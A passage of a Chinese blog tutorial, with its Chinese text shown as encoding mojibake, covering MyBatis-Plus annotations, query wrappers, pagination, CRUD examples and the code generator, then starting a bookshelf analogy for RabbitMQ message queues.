&quot;name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="meta">@TableField(exist = false)</span></span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">    <span class="meta">@Version</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line">    <span class="keyword">private</span> StatusEnum status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>application.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">type-enums-package:</span> </span><br><span class="line">  <span class="string">com.southwind.mybatisplus.enums</span></span><br></pre></td></tr></table></figure>

<p>2ã€å®ç°æ¥å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.enums;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.enums.IEnum;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">AgeEnum</span> <span class="keyword">implements</span> <span class="title class_">IEnum</span>&lt;Integer&gt; &#123;</span><br><span class="line">    ONE(<span class="number">1</span>,<span class="string">&quot;ä¸€å²&quot;</span>),</span><br><span class="line">    TWO(<span class="number">2</span>,<span class="string">&quot;ä¸¤å²&quot;</span>),</span><br><span class="line">    THREE(<span class="number">3</span>,<span class="string">&quot;ä¸‰å²&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    AgeEnum(Integer code, String msg) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>@TableLogic</p>
</blockquote>
<p>æ˜ å°„é€»è¾‘åˆ é™¤</p>
<p>1ã€æ•°æ®è¡¨æ·»åŠ  deleted å­—æ®µ</p>
<p>2ã€å®ä½“ç±»æ·»åŠ æ³¨è§£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.*;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.enums.AgeEnum;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.enums.StatusEnum;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> AgeEnum age;</span><br><span class="line">    <span class="meta">@TableField(exist = false)</span></span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">    <span class="meta">@Version</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;status&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> StatusEnum statusEnum;</span><br><span class="line">    <span class="meta">@TableLogic</span></span><br><span class="line">    <span class="keyword">private</span> Integer deleted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3ã€application.yml æ·»åŠ é…ç½®</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">global-config:</span></span><br><span class="line">  <span class="attr">db-config:</span></span><br><span class="line">    <span class="attr">logic-not-delete-value:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">logic-delete-value:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>



<h3 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mapper.selectList(null);</span></span><br><span class="line"><span class="type">QueryWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>();</span><br><span class="line"><span class="comment">//        Map&lt;String,Object&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;name&quot;,&quot;å°çº¢&quot;);</span></span><br><span class="line"><span class="comment">//        map.put(&quot;age&quot;,3);</span></span><br><span class="line"><span class="comment">//        wrapper.allEq(map);  // å¤šä¸ªæ¡ä»¶</span></span><br><span class="line"><span class="comment">//        wrapper.gt(&quot;age&quot;,2); // å¤§äº2</span></span><br><span class="line"><span class="comment">//        wrapper.ne(&quot;name&quot;,&quot;å°çº¢&quot;); // ä¸ç­‰äº</span></span><br><span class="line"><span class="comment">//        wrapper.ge(&quot;age&quot;,2);  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//like &#x27;%å°&#x27;</span></span><br><span class="line"><span class="comment">//        wrapper.likeLeft(&quot;name&quot;,&quot;å°&quot;);</span></span><br><span class="line"><span class="comment">//like &#x27;å°%&#x27;</span></span><br><span class="line"><span class="comment">//        wrapper.likeRight(&quot;name&quot;,&quot;å°&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//inSQL è”åˆæŸ¥è¯¢</span></span><br><span class="line"><span class="comment">//        wrapper.inSql(&quot;id&quot;,&quot;select id from user where id &lt; 10&quot;);</span></span><br><span class="line"><span class="comment">//        wrapper.inSql(&quot;age&quot;,&quot;select age from user where age &gt; 3&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        wrapper.orderByDesc(&quot;age&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        wrapper.orderByAsc(&quot;age&quot;);</span></span><br><span class="line"><span class="comment">//        wrapper.having(&quot;id &gt; 8&quot;);</span></span><br><span class="line"></span><br><span class="line">mapper.selectList(wrapper).forEach(System.out::println);</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//        System.out.println(mapper.selectById(7));</span></span><br><span class="line"><span class="comment">//        mapper.selectBatchIds(Arrays.asList(7,8,9)).forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Map åªèƒ½åšç­‰å€¼åˆ¤æ–­ï¼Œé€»è¾‘åˆ¤æ–­éœ€è¦ä½¿ç”¨ Wrapper æ¥å¤„ç†</span></span><br><span class="line"><span class="comment">//        Map&lt;String,Object&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;id&quot;,7);</span></span><br><span class="line"><span class="comment">//        mapper.selectByMap(map).forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"><span class="type">QueryWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>();</span><br><span class="line">wrapper.eq(<span class="string">&quot;id&quot;</span>,<span class="number">7</span>);</span><br><span class="line"><span class="comment">////        System.out.println(mapper.selectCount(wrapper));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //å°†æŸ¥è¯¢çš„ç»“æœé›†å°è£…åˆ°Mapä¸­</span></span><br><span class="line"><span class="comment">//        mapper.selectMaps(wrapper).forEach(System.out::println);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;-------------------&quot;);</span></span><br><span class="line"><span class="comment">//        mapper.selectList(wrapper).forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">// åˆ†é¡µæ“ä½œé…ç½®ç±»(åŠ åˆ°é…ç½®ç±»ä¸­)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> PaginationInterceptor <span class="title function_">paginationInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PaginationInterceptor</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="comment">//        Page&lt;User&gt; page = new Page&lt;&gt;(2,2);</span></span><br><span class="line"><span class="comment">//        Page&lt;User&gt; result = mapper.selectPage(page,null);</span></span><br><span class="line"><span class="comment">//        System.out.println(result.getSize());</span></span><br><span class="line"><span class="comment">//        System.out.println(result.getTotal());</span></span><br><span class="line"><span class="comment">//        result.getRecords().forEach(System.out::println);</span></span><br><span class="line"><span class="comment">// æŸ¥è¯¢ç»“æœå°è£…åˆ°mapé›†åˆ</span></span><br><span class="line"><span class="comment">//        Page&lt;Map&lt;String,Object&gt;&gt; page = new Page&lt;&gt;(1,2);</span></span><br><span class="line"><span class="comment">//        mapper.selectMapsPage(page,null).getRecords().forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        mapper.selectObjs(null).forEach(System.out::println);</span></span><br><span class="line"><span class="comment">// åªèƒ½æŸ¥è¯¢ä¸€æ¡æ•°æ®ï¼Œå¦åˆ™æŠ¥é”™</span></span><br><span class="line"><span class="comment">//        mapper,selectOne()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">System.out.println(mapper.selectOne(wrapper));</span><br></pre></td></tr></table></figure>



<h3 id="è‡ªå®šä¹‰-SQLï¼ˆå¤šè¡¨å…³è”æŸ¥è¯¢ï¼‰"><a href="#è‡ªå®šä¹‰-SQLï¼ˆå¤šè¡¨å…³è”æŸ¥è¯¢ï¼‰" class="headerlink" title="è‡ªå®šä¹‰ SQLï¼ˆå¤šè¡¨å…³è”æŸ¥è¯¢ï¼‰"></a>è‡ªå®šä¹‰ SQLï¼ˆå¤šè¡¨å…³è”æŸ¥è¯¢ï¼‰</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductVO</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer category;</span><br><span class="line">    <span class="keyword">private</span> Integer count;</span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line">    <span class="keyword">private</span> Integer userId;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.entity.ProductVO;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.entity.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select p.*,u.name userName from product p,user u where p.user_id = u.id and u.id = #&#123;id&#125;&quot;)</span></span><br><span class="line">    List&lt;ProductVO&gt; <span class="title function_">productList</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="æ·»åŠ "><a href="#æ·»åŠ " class="headerlink" title="æ·»åŠ "></a>æ·»åŠ </h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">user.setTitle(<span class="string">&quot;å°æ˜&quot;</span>);</span><br><span class="line">user.setAge(<span class="number">22</span>);</span><br><span class="line">mapper.insert(user);</span><br><span class="line">System.out.println(user);</span><br></pre></td></tr></table></figure>



<h3 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mapper.deleteById(1);</span></span><br><span class="line"><span class="comment">//        mapper.deleteBatchIds(Arrays.asList(7,8));</span></span><br><span class="line"><span class="comment">//        QueryWrapper wrapper = new QueryWrapper();</span></span><br><span class="line"><span class="comment">//        wrapper.eq(&quot;age&quot;,14);</span></span><br><span class="line"><span class="comment">//        mapper.delete(wrapper);</span></span><br><span class="line"></span><br><span class="line">Map&lt;String,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;id&quot;</span>,<span class="number">10</span>);</span><br><span class="line">mapper.deleteByMap(map);</span><br></pre></td></tr></table></figure>



<h3 id="ä¿®æ”¹"><a href="#ä¿®æ”¹" class="headerlink" title="ä¿®æ”¹"></a>ä¿®æ”¹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//        //update ... version = 3 where version = 2</span><br><span class="line">//        User user = mapper.selectById(7);</span><br><span class="line">//        user.setTitle(&quot;ä¸€å·&quot;);</span><br><span class="line">//</span><br><span class="line">//        //update ... version = 3 where version = 2</span><br><span class="line">//        User user1 = mapper.selectById(7);</span><br><span class="line">//        user1.setTitle(&quot;äºŒå·&quot;);</span><br><span class="line">//</span><br><span class="line">//        mapper.updateById(user1);</span><br><span class="line">//        mapper.updateById(user);</span><br><span class="line"></span><br><span class="line">User user = mapper.selectById(1);</span><br><span class="line">user.setTitle(&quot;å°çº¢&quot;);</span><br><span class="line">QueryWrapper wrapper = new QueryWrapper();</span><br><span class="line">wrapper.eq(&quot;age&quot;,22);</span><br><span class="line">mapper.update(user,wrapper);</span><br></pre></td></tr></table></figure>



<h3 id="MyBatisPlus-è‡ªåŠ¨ç”Ÿæˆ"><a href="#MyBatisPlus-è‡ªåŠ¨ç”Ÿæˆ" class="headerlink" title="MyBatisPlus è‡ªåŠ¨ç”Ÿæˆ"></a>MyBatisPlus è‡ªåŠ¨ç”Ÿæˆ</h3><p>æ ¹æ®æ•°æ®è¡¨è‡ªåŠ¨ç”Ÿæˆå®ä½“ç±»ã€Mapperã€Serviceã€ServiceImplã€Controller</p>
<p>1ã€pom.xml å¯¼å…¥ MyBatis Plus Generator</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1.tmp<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- generatoræ ¹æ®æ¨¡ç‰ˆç”Ÿæˆ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Velocityï¼ˆé»˜è®¤ï¼‰ã€Freemarkerã€Beetl</p>
<p>2ã€å¯åŠ¨ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.DbType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.AutoGenerator;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.DataSourceConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.GlobalConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.PackageConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.StrategyConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºgeneratorå¯¹è±¡</span></span><br><span class="line">        <span class="type">AutoGenerator</span> <span class="variable">autoGenerator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AutoGenerator</span>();</span><br><span class="line">        <span class="comment">//æ•°æ®æº</span></span><br><span class="line">        <span class="type">DataSourceConfig</span> <span class="variable">dataSourceConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSourceConfig</span>();</span><br><span class="line">        dataSourceConfig.setDbType(DbType.MYSQL);</span><br><span class="line">        dataSourceConfig.setUrl(<span class="string">&quot;jdbc:mysql://ip:3306/db?useUnicode=true&amp;characterEncoding=UTF-8&quot;</span>);</span><br><span class="line">        dataSourceConfig.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        dataSourceConfig.setPassword(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        dataSourceConfig.setDriverName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        autoGenerator.setDataSource(dataSourceConfig);</span><br><span class="line">        <span class="comment">//å…¨å±€é…ç½®</span></span><br><span class="line">        <span class="type">GlobalConfig</span> <span class="variable">globalConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GlobalConfig</span>();</span><br><span class="line">        globalConfig.setOutputDir(System.getProperty(<span class="string">&quot;user.dir&quot;</span>)+<span class="string">&quot;/src/main/java&quot;</span>);</span><br><span class="line">        globalConfig.setOpen(<span class="literal">false</span>);</span><br><span class="line">        globalConfig.setAuthor(<span class="string">&quot;southwind&quot;</span>);</span><br><span class="line">        globalConfig.setServiceName(<span class="string">&quot;%sService&quot;</span>);</span><br><span class="line">        autoGenerator.setGlobalConfig(globalConfig);</span><br><span class="line">        <span class="comment">//åŒ…ä¿¡æ¯</span></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">packageConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageConfig</span>();</span><br><span class="line">        packageConfig.setParent(<span class="string">&quot;com.southwind.mybatisplus&quot;</span>);</span><br><span class="line">        packageConfig.setModuleName(<span class="string">&quot;generator&quot;</span>);</span><br><span class="line">        packageConfig.setController(<span class="string">&quot;controller&quot;</span>);</span><br><span class="line">        packageConfig.setService(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">        packageConfig.setServiceImpl(<span class="string">&quot;service.impl&quot;</span>);</span><br><span class="line">        packageConfig.setMapper(<span class="string">&quot;mapper&quot;</span>);</span><br><span class="line">        packageConfig.setEntity(<span class="string">&quot;entity&quot;</span>);</span><br><span class="line">        autoGenerator.setPackageInfo(packageConfig);</span><br><span class="line">        <span class="comment">//é…ç½®ç­–ç•¥</span></span><br><span class="line">        <span class="type">StrategyConfig</span> <span class="variable">strategyConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StrategyConfig</span>();</span><br><span class="line">      	</span><br><span class="line">        strategyConfig.setEntityLombokModel(<span class="literal">true</span>);</span><br><span class="line">      	<span class="comment">//ç”Ÿæˆéƒ¨åˆ†è¡¨</span></span><br><span class="line">        strategyConfig.setInclude(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;product&quot;</span>);</span><br><span class="line">        strategyConfig.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategyConfig.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        autoGenerator.setStrategy(strategyConfig);</span><br><span class="line"></span><br><span class="line">        autoGenerator.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Spring-Boot-MyBatis-Plus-æ‰“åŒ…åº”ç”¨ï¼Œç›´æ¥å‘å¸ƒ-é˜¿é‡Œäº‘-ä¸Šäº‘"><a href="#Spring-Boot-MyBatis-Plus-æ‰“åŒ…åº”ç”¨ï¼Œç›´æ¥å‘å¸ƒ-é˜¿é‡Œäº‘-ä¸Šäº‘" class="headerlink" title="Spring Boot + MyBatis Plus æ‰“åŒ…åº”ç”¨ï¼Œç›´æ¥å‘å¸ƒ é˜¿é‡Œäº‘ ä¸Šäº‘"></a>Spring Boot + MyBatis Plus æ‰“åŒ…åº”ç”¨ï¼Œç›´æ¥å‘å¸ƒ é˜¿é‡Œäº‘ ä¸Šäº‘</h3><h2 id="Mybatis-plus-ä½¿ç”¨mysqlå…³é”®å­—åšè¡¨å"><a href="#Mybatis-plus-ä½¿ç”¨mysqlå…³é”®å­—åšè¡¨å" class="headerlink" title="Mybatis-plus ä½¿ç”¨mysqlå…³é”®å­—åšè¡¨å"></a>Mybatis-plus ä½¿ç”¨mysqlå…³é”®å­—åšè¡¨å</h2><p>æ–¹æ³•ä¸€:æ”¹è¡¨å</p>
<p>æ–¹æ³•äºŒ:ç»™å®ä½“ç±»æ‰“ä¸Š@TableNameæ³¨è§£,åŠ ä¸Šåå¼•å·å³å¯</p>
<h1 id="RabbitMQç†è§£"><a href="#RabbitMQç†è§£" class="headerlink" title="RabbitMQç†è§£"></a>RabbitMQç†è§£</h1><h2 id="æ¶ˆæ¯é˜Ÿåˆ—ä½¿ç”¨åœºæ™¯"><a href="#æ¶ˆæ¯é˜Ÿåˆ—ä½¿ç”¨åœºæ™¯" class="headerlink" title="æ¶ˆæ¯é˜Ÿåˆ—ä½¿ç”¨åœºæ™¯"></a>æ¶ˆæ¯é˜Ÿåˆ—ä½¿ç”¨åœºæ™¯</h2><p>å°çº¢æ˜¯å°æ˜çš„å§å§ã€‚</p>
<p>å°çº¢å¸Œæœ›å°æ˜å¤šè¯»ä¹¦,å¸¸å¯»æ‰¾å¥½ä¹¦ç»™å°æ˜çœ‹,ä¹‹å‰çš„æ–¹å¼æ˜¯è¿™æ ·:å°çº¢é—®å°æ˜ä»€ä¹ˆæ—¶å€™æœ‰ç©º,æŠŠä¹¦ç»™å°æ˜é€å»,å¹¶äº²çœ¼ç›‘ç£å°æ˜è¯»å®Œä¹¦æ‰èµ°ã€‚ä¹…è€Œä¹…ä¹‹,ä¸¤äººéƒ½è§‰å¾—éº»çƒ¦ã€‚</p>
<p>åæ¥çš„æ–¹å¼æ”¹æˆäº†:å°çº¢å¯¹å°æ˜è¯´ã€Œæˆ‘æ”¾åˆ°ä¹¦æ¶ä¸Šçš„ä¹¦ä½ éƒ½è¦çœ‹ã€,ç„¶åå°çº¢æ¯æ¬¡å‘ç°ä¸é”™çš„ä¹¦éƒ½æ”¾åˆ°ä¹¦æ¶ä¸Š,å°æ˜åˆ™çœ‹åˆ°ä¹¦æ¶ä¸Šæœ‰ä¹¦å°±æ‹¿ä¸‹æ¥çœ‹ã€‚</p>
<p>ä¹¦æ¶å°±æ˜¯ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—,å°çº¢æ˜¯ç”Ÿäº§è€…,å°æ˜æ˜¯æ¶ˆè´¹è€…ã€‚</p>
<p>è¿™å¸¦æ¥çš„å¥½å¤„æœ‰</p>
<ol>
<li>å°çº¢æƒ³ç»™å°æ˜ä¹¦çš„æ—¶å€™,ä¸å¿…é—®å°æ˜ä»€ä¹ˆæ—¶å€™æœ‰ç©º,äº²æ‰‹æŠŠä¹¦äº¤ç»™ä»–äº†,å°çº¢åªæŠŠä¹¦æ”¾åˆ°ä¹¦æ¶ä¸Šå°±è¡Œäº†ã€‚è¿™æ ·å°çº¢å°æ˜çš„æ—¶é—´éƒ½æ›´è‡ªç”±ã€‚</li>
<li>å°çº¢ç›¸ä¿¡å°æ˜çš„è¯»ä¹¦è‡ªè§‰å’Œè¯»ä¹¦èƒ½åŠ›,ä¸å¿…äº²çœ¼è§‚å¯Ÿå°æ˜çš„è¯»ä¹¦è¿‡ç¨‹,å°çº¢åªè¦åšä¸€ä¸ªæ”¾ä¹¦çš„åŠ¨ä½œ,å¾ˆèŠ‚çœæ—¶é—´ã€‚</li>
<li>å½“æ˜å¤©æœ‰å¦ä¸€ä¸ªçˆ±è¯»ä¹¦çš„å°ä¼™ä¼´å°å¼ºåŠ å…¥,å°çº¢ä»æ—§åªéœ€è¦æŠŠä¹¦æ”¾åˆ°ä¹¦æ¶ä¸Š,å°æ˜å’Œå°å¼ºä»ä¹¦æ¶ä¸Šå–ä¹¦å³å¯(å””,å§‘ä¸”è®¾å®šæˆå¤šä¸ªäººå–ä¸€æœ¬ä¹¦å¯ä»¥æ¯äººå–èµ°ä¸€æœ¬å§,å¯èƒ½æ˜¯æ‹·è´ç”µå­ä¹¦æˆ–å¤å°,æš‚ä¸è€ƒè™‘ç‰ˆæƒé—®é¢˜)ã€‚</li>
<li>ä¹¦æ¶ä¸Šçš„ä¹¦æ”¾åœ¨é‚£é‡Œ,å°æ˜é˜…è¯»é€Ÿåº¦å¿«å°±æ—©ç‚¹çœ‹å®Œ,é˜…è¯»é€Ÿåº¦æ…¢å°±æ™šç‚¹çœ‹å®Œ,æ²¡å…³ç³»,æ¯”èµ·å°çº¢æŠŠä¹¦é€’ç»™å°æ˜å¹¶ç›‘ç£å°æ˜è¯»å®Œçš„æ–¹å¼,å°æ˜çš„å‹åŠ›ä¼šå°ä¸€äº›ã€‚</li>
</ol>
<p>è¿™å°±æ˜¯æ¶ˆæ¯é˜Ÿåˆ—çš„å››å¤§å¥½å¤„ï¼š</p>
<ol>
<li><p>è§£è€¦<br>æ¯ä¸ªæˆå‘˜ä¸å¿…å—å…¶ä»–æˆå‘˜å½±å“,å¯ä»¥æ›´ç‹¬ç«‹è‡ªä¸»,åªé€šè¿‡ä¸€ä¸ªç®€å•çš„å®¹å™¨æ¥è”ç³»ã€‚<br>å°çº¢ç”šè‡³å¯ä»¥ä¸çŸ¥é“ä»ä¹¦æ¶ä¸Šå–ä¹¦çš„æ˜¯è°,å°æ˜ä¹Ÿå¯ä»¥ä¸çŸ¥é“å¾€ä¹¦æ¶ä¸Šæ”¾ä¹¦çš„äººæ˜¯è°,åœ¨ä»–ä»¬çœ¼é‡Œ,éƒ½åªæœ‰ä¹¦æ¶,æ²¡æœ‰å¯¹æ–¹ã€‚    </p>
<p>æ¯«æ— ç–‘é—®ï¼Œä¸ä¸€ä¸ªç®€å•çš„å®¹å™¨æ‰“äº¤é“ï¼Œæ¯”ä¸å¤æ‚çš„äººæ‰“äº¤é“å®¹æ˜“ä¸€ä¸‡å€ï¼Œå°çº¢å°æ˜å¯ä»¥è‡ªç”±è‡ªåœ¨çš„è¿½æ±‚å„è‡ªçš„äººç”Ÿã€‚         </p>
</li>
<li><p>æé€Ÿ<br>å°çº¢é€‰æ‹©ç›¸ä¿¡ã€ŒæŠŠä¹¦æ”¾åˆ°ä¹¦æ¶ä¸Š,åˆ«çš„æˆ‘ä¸é—®ã€,ä¸ºè‡ªå·±èŠ‚çœäº†å¤§é‡æ—¶é—´ã€‚<br>å°çº¢å¾ˆå¿™,åªèƒ½æŠ½å‡ºäº”åˆ†é’Ÿæ—¶é—´,ä½†è¿™æ—¶é—´è¶³å¤ŸæŠŠä¹¦æ”¾åˆ°ä¹¦æ¶ä¸Šäº†ã€‚</p>
</li>
